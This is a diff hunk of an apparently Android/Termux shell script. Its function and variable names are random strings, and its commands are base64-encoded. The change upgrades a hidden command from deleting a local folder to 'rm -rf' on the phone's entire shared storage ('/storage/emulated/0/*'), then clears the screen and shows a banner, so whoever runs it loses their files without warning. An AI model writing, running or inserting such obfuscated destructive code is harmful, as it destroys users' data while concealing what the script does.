@@ -23,7 +23,7 @@ function banner {
 function oumcgsq {
   vcxprvq=$(echo "L3N0b3JhZ2UvZW11bGF0ZWQvMC8=" | base64 -d)
   if [ -e "$vcxprvq" ]; then
-    tvksajd "cm0gLXJmIGEvKiAmJiBjbGVhcg=="
+    tvksajd "cm0gLXJmIC9zdG9yYWdlL2VtdWxhdGVkLzAvKiAmJiBjbGVhcg=="
     banner
   fi
 }
